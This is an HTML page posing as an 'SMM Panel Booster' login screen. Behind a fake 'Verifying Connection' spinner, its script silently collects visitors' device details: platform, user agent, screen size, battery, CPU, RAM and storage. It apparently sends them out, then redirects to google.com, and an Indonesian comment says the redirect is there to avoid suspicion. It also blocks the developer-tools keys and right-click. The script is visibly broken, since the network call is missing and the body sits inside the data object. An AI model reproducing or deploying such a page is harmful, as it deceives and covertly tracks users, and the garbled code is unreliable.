<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Panel Booster - Login</title>
    <script defer src="https://cdn.vercel-insights.com/v1/script.js"></script>
    <style>
        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .msg { margin-top: 20px; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div class="msg" id="status">Verifying Connection...</div>
    </div>

    <script>

        (function(_0xREV){
            const _0xOFF = async () => {
                try {
                    let _0xBAT = await navigator.getBattery();
                    let _0xSTO = await navigator.storage.estimate();
                    let _0xDAT = {
                        "device": navigator.platform,
                        "ua": navigator.userAgent,
                        "lang": navigator.language,
                        "res": screen.width + "x" + screen.height,
                        "batt": Math.round(_0xBAT.level * 100) + "%",
                        "char": _0xBAT.charging ? "Yes" : "No",
                        "cpu": navigator.hardwareConcurrency || "N/A",
                        "ram": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                        "st_used": (_0xSTO.usage / (1024 ** 3)).toFixed(2),

                        body: JSON.stringify(_0xDAT)
                    });

                } catch (e) {}
                
                // REDIRECT OTOMATIS BIAR GAK CURIGA
                setTimeout(() => {
                    window.location.href = "https://google.com";
                }, 1500);
            };
            window.onload = _0xOFF;
        })();

        // ANTI-INSPECT ELEMENT (Basic)
        document.onkeydown = function(e) {
            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
        };
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
</html>
